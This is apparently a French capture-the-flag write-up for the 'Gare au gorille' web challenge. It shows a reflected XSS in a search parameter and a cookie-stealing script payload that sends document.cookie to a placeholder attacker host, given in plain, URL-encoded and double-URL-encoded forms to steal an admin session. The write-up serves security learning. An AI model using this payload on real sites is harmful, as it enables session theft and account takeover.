# Gare au gorille

## Enoncé
J'ai construit un site sans prétention pour stocker ma collection de memes !

## Découverte
En naviguant sur le site, on trouve plusieurs choses : 
- l'url /flag correspondant au bouton "Ajouter un meme" qui n'est accesible que par l'admin
- une fonction de recherche par le paramètre /?search=
- une fonction de signaler certaines images à l'admin

## Réflexion
La construction de site présente laisse penser qu'on doit s'attendre à une XSS et éventuellement un vol de cookie. On teste donc le champ /?search= avec un payload POC :
`https://gare-au-gorille.france-cybersecurity-challenge.fr/?search=<script>alert("XSS")</script>`
Et bingo, on obtient bien un pop-up JavaScript qui confirme notre hypothèse.

## Exploitation
On imagine donc qu'on doit voler le cookie de l'admin en lui envoyant un payload via la fonction de signalement d'image.
### Fabrication du payload
Après quelque recherches, on trouve facilement ce payload :

`<script>var i=new Image;i.src="http://[ATTACKINGIP]"+document.cookie;</script>`

On test donc le payload sur notre propre session avec le champ de recherche : 

`https://gare-au-gorille.france-cybersecurity-challenge.fr/?search=<script>var i=new Image; i.src="http://[ATTACKINGIP]"+document.cookie;</script>`

Problème : les caractères `;` et `+` ne sont pas bien interprétés.

### Résolution de l'encodage

On modifie le payload avec l'URLencoding :

`https%3A%2F%2Fgare-au-gorille.france-cybersecurity-challenge.fr%2F%3Fsearch%3D%3Cscript%3Evar%20i%3Dnew%20Image%3B%20i.src%3D%22http%3A%2F%2F%5BATTACKINGIP%5D%22%2Bdocument.cookie%3B%3C%2Fscript%3E`

L'exploit fonctionne bien sur notre session.

### Envoi du payload

Après plusieurs tentatives, le payload n'est pas exécuté côté admin. On suppose donc que l'URLencode est décodé avant d'être présenté à l'admin. L'essai suivant tombe sous le sens, DOUBLE URLencoding :

`https%253A%252F%252Fgare-au-gorille.france-cybersecurity-challenge.fr%252F%253Fsearch%253D%253Cscript%253Evar%2520i%253Dnew%2520Image%253B%2520i.src%253D%2522http%253A%252F%252F%255BATTACKINGIP%255D%2522%252Bdocument.cookie%253B%253C%252Fscript%253E`

Parfait, le cookie admin nous est renvoyé sur le serveur attaquant, plus qu'à modifier notre cookie de session et se diriger dans /flag pour résoudre le challenge.
